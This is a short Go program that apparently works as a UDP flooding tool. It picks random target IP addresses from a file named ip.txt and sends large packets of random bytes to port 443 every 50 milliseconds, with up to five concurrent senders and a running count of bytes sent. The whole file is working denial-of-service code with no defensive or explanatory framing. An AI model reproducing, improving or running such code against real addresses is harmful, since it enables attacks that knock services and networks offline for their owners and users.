package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"sync"
	"time"

	"github.com/dustin/go-humanize"
)

var bytesSiz uint64 = 0
var UserSizeINPUT int
var ipList = "ip.txt"

func randomINT(min int, max int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(max-min) + min
}

func randomIP() string {
	file, err := os.Open(ipList)
	if err != nil {
		log.Fatal(err)
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {
			log.Fatal(err)
		}
	}(file)
	scanner := bufio.NewScanner(file)
	randSource := rand.NewSource(time.Now().UnixNano())
	randGenerator := rand.New(randSource)

	lineNum := 1
	var pick string
	for scanner.Scan() {
		line := scanner.Text()
		roll := randGenerator.Intn(lineNum)
		if roll == 0 {
			pick = line
		}
		lineNum += 1
	}
	return pick
}

func bytesSUM(new int) {
	tmp := uint64(new)
	bytesSiz = tmp + bytesSiz
}

func sendPacket(conn *net.UDPConn, addr *net.UDPAddr, UserInputSize int, duration time.Duration) {
	randomPaketSize := randomINT(UserInputSize-1000, UserInputSize+2506)

	bytesSUM(randomPaketSize)
	buf := make([]byte, randomPaketSize)

	_, err := rand.Read(buf)
	if err != nil {
		log.Fatalf("err while generating random string: %s", err)
	}
	n, err := conn.WriteTo(buf, addr)
	if err != nil {
		log.Fatal("Write:", err)
	}
	fmt.Println(duration, "   Sent   ", n, "   bytes  ->   ", addr, "    ", humanize.Bytes(bytesSiz))

}

func send(start time.Time, conn *net.UDPConn) {

	for {
		duration := time.Since(start)
		sendPacket(conn, &net.UDPAddr{IP: net.ParseIP(randomIP()), Port: 443}, 63000, duration)
		time.Sleep(time.Millisecond * 50)
	}

}

func main() {
	start := time.Now()
	flag.IntVar(&UserSizeINPUT, "t", 1, "number of lines to read from the file")
	flag.Parse()
	fmt.Println(UserSizeINPUT)
	time.Sleep(time.Millisecond * 1000)
	var wg sync.WaitGroup
	wg.Add(UserSizeINPUT)
	conn, _ := net.ListenUDP("udp", &net.UDPAddr{Port: 1234})

	switch UserSizeINPUT {
	case 1:
		go func() {
			send(start, conn)
		}()
	case 2:
		go func() {
			go send(start, conn)
			go send(start, conn)
		}()
	case 3:
		go func() {
			go send(start, conn)
			go send(start, conn)
			go send(start, conn)
		}()
	case 4:
		go func() {
			go send(start, conn)
			go send(start, conn)
			go send(start, conn)
			go send(start, conn)
		}()
	case 5:
		go func() {
			go send(start, conn)
			go send(start, conn)
			go send(start, conn)
			go send(start, conn)
			go send(start, conn)
		}()
	}
	wg.Wait()
}
